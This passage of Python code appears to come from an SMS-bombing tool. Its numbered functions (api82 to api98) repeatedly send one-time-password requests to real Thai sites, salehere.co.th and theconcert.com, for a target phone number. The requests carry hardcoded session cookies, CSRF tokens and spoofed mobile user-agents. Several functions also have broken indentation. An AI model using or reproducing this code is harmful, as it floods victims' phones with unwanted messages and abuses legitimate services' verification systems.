	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
	
def api82():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api83():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api84():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	

def api85():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api86():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api87():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
def api88():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api89():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api90():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
	
def api91():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api92():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api93():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
	
def api94():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api95():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api96():
head = {
	"content-type": "application/json",
	"accept": "*/*",
	"user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
	"referer": "https://salehere.co.th/",
	"cookie": "_fbp=fb.2.1648385201793.1379988974;_gid=GA1.3.1234211865.1648385203;_gat_UA-118968627-9=1;__utma=195884718.1573510301.1648385203.1648385203.1648385203.1;__utmc=195884718;__utmz=195884718.1648385203.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided);__utmt_%5Bobject%20Object%5D=1;G_ENABLED_IDPS=google;__utmb=195884718.2.10.1648385203;_ga_TQ163J47DR=GS1.1.1648385205.1.0.1648385205.0;_ga=GA1.1.1573510301.1648385203"
	    }
	requests.post("https://api.salehere.co.th/graphql",headers=head,json={"operationName":"sendUserOTPV2","variables":{"tel":phone,"token":""},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"}}})
	
	
def api97():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": "_gcl_au=1.1.1502258808.1656237331;_fbp=fb.1.1656237331957.603057766;__gads=ID=eb23ce56d1c7de3e-22e38929c0d40031:T=1656237332:RT=1656237332:S=ALNI_MZC9-jiB6phkTi6InD_2HFqsf7dTA;lang=th;pagesInSession=1;__gpi=UID=00000633fd49bde3:T=1656237332:RT=1656415272:S=ALNI_MZJBTJ3y6ilUC3xgp70URp3GC1PEg;_ga_N9T2LF0PJ1=GS1.1.1656415272.2.0.1656415272.0;_ga=GA1.2.543101815.1656237332;_gid=GA1.2.846940337.1656415273;_gat_UA-133219660-2=1;popup_1436=true;adonis-session=95ad0fa91d1d2f313006a0e2b0ef4a55VMCjUjHXUP5Z7dIt9yj0ikjCYKp6h2Y%2B0opJ%2FIEkK1igD11Zq3PhMqfGOSfG3%2F5R5C%2FLCKcoaEYy14g4HXhfjwGl5eOP1MZpX99v3PE75RD8GTZOTSvxcNvhvTTGYHI7;XSRF-TOKEN=33ed88f53546803c779ff8c10e7386057YuSCY%2FkUuCibrt0phirk%2BftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc%2BUMKSLdUFEtf7U4rRzuy2rvmK%2BLFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8"},json={"mobile":phone,"country_code":"TH","lang":"th","channel":"sms","digit":4})

def api98():
requests.post("https://www.theconcert.com/rest/request-otp",headers={"x-xsrf-token": "33ed88f53546803c779ff8c10e7386057YuSCY/kUuCibrt0phirk+ftZp83UlwChfA5qjn8OJy268fFbtZDDu5U3Wc+UMKSLdUFEtf7U4rRzuy2rvmK+LFcY5y5N6eextOHy53Eg9zuedQdkV0DSRIKKo4q0CBA","x-csrf-token": "ai49Zub4-IsdrbJwOTXdL5bZy1RU2QvpHSPc","cookie": 